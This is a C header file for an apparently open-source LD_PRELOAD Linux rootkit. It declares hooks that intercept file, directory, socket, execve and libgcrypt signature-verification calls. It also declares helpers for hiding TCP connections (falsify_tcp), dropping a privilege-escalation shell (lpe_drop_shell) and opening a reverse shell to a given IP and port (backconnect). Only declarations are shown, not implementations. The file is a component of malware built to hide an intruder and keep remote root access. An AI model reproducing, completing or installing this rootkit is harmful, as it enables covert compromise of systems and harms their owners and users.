#ifndef FATHER_H
#define FATHER_H
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <dlfcn.h>
#include <signal.h>
#include <time.h>
#include <pwd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <dirent.h>
#include <gcrypt.h>
#include <string.h>
#include <stdlib.h>
#include <stdarg.h>
#include <errno.h>
#include "config.h"

// could be needed on some versions of glibc
// https://lists.fedoraproject.org/archives/list/devel@lists.fedoraproject.org/message/SMQ3RYXEYTVZH6PLQMKNB3NM4XLPMNZO/
// credits to Jan Pazdziora and Ilya Lipnitskiy
#ifndef _STAT_VER
 #if defined (__aarch64__)
	#define _STAT_VER 0
 #elif defined (__x86_64__)
	#define _STAT_VER 1
 #else
	#define _STAT_VER 3
 #endif
#endif

// function pointers
extern int (*o_lxstat)(int, const char *, struct stat *);
extern int (*o_lxstat64)(int, const char *, struct stat64 *);
extern int (*o_lstat)(const char *, struct stat *);
extern int (*o_fstat)(int, struct stat *);
extern int (*o_access)(const char *, int mode);
extern int (*o_open)(const char *, int, mode_t);
extern int (*o_open64)(const char *, int, mode_t);
extern int (*o_openat)(int, const char *, int);
extern int (*o_accept)(int, struct sockaddr *, socklen_t *);
extern struct dirent * (*o_readdir)(DIR *);
extern int (*o_unlink)(const char *);
extern int (*o_unlinkat)(int, const char *, int);
extern int (*o_getsockname)(int, struct sockaddr *, socklen_t *);
extern FILE * (*o_fopen)(const char *, const char *);
extern FILE * (*o_fopen64)(const char *, const char *);
extern DIR * (*o_opendir)(const char *);
extern int (*o_execve)(const char *, char *const argv[], char *const envp[]);
extern gcry_error_t (*o_verify)(gcry_sexp_t, gcry_sexp_t, gcry_sexp_t);

// functions hooks (interceptions)
extern int __lxstat(int version, const char *path, struct stat *buf);
extern int __lxstat64(int version, const char *path, struct stat64 *buf);
extern int lstat(const char * path, struct stat * buf);
extern int fstat(int filedes, struct stat *buf);
extern int access(const char * pathname, int mode);
extern int open(const char *pathname, int flags, mode_t mode);
extern int open64(const char *pathname, int flags, mode_t mode);
extern int openat(int dirfd, const char * pathname, int flags);
extern struct dirent * readdir(DIR *p);
extern int unlink(const char *pathname);
extern int unlinkat(int dirfd, const char * pathname, int flags);
extern int getsockname(int socket, struct sockaddr * addr, socklen_t * addrlen);
extern FILE * fopen(const char * pathname, const char *mode);
extern FILE * fopen64(const char * pathname, const char * mode);
extern int accept(int sockfd, struct sockaddr * addr, socklen_t * addrlen);
extern DIR * opendir(const char *name);
extern int execve(const char *path, char *const argv[], char *const envp[]);
extern gcry_error_t gcry_pk_verify(gcry_sexp_t sig, gcry_sexp_t data, gcry_sexp_t pkey);

// utility functions
extern FILE * falsify_tcp(const char * pathname, const char * mode, FILE * (*old_fopen)(const char *, const char *));
extern void lpe_drop_shell();
extern void backconnect(char * ip, int port);

// ascii art
extern char art[];

#endif
